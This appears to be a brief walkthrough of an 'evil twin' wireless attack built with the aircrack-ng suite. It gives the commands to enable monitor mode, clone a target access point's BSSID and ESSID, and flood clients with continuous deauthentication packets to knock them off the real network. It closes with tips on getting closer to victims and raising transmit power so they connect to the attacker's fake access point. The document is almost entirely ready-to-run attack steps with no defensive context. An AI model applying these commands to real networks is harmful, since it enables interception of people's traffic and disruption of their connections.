# Note: You need a wireless card with a chipset capable of going into monitor mode
# You need to have the aircrack-ng suite installed
> apt-get install aircrack-ng (for Debian based distributions)
OR 
> yum install aircrack-ng (for CentOS / RHEL)
OR (manual compile/install)
> wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc2.tar.gz
> tar -zxvf aircrack-ng-1.2-rc2.tar.gz (decompress the tarball)
> cd aircrack-ng-1.2-rc2 (change to the uncompressed directory)
> make (run make to build the binaries, no need for > ./configure)
> make install (installs (copies) the binaries into the appropriate locations on the system, no registry in linux..)

# Show all wireless interfaces
> iwconfig
# Start monitor mode, monitor iface mon0 will show up (see output)
> airmon-ng start wlan1
# Capture packets from the new monitor iface
> airodump-ng mon0

# Create the twin
> airbase-ng -a <BSSID here> --essid <ESSID here> -c <channel here> <interface name>

# If you face any problems, a shorter code will be
> airbase-ng --essid <name of network> mon0 

# Force clients to disconnect from their AP, --deauth 0 sends deauth packets quickly, 1 would be every second
> aireplay-ng --deauth 0 -a <BSSID> mon0 --ignore-negative-one

Not the real one, but why the fake one
Even after being disconnected from the real AP, the client may choose to keep trying to connect to the same AP a few more times, instead of trying to connect to ours. We need to make our AP stand out, and for that, we need more signal strength. There are 2 ways to do that-

Physically move closer to the client.
Power up your wireless card to transmit at more power. 
The latter can be done with the following command if supported by the card
> iwconfig wlan1 txpower 27
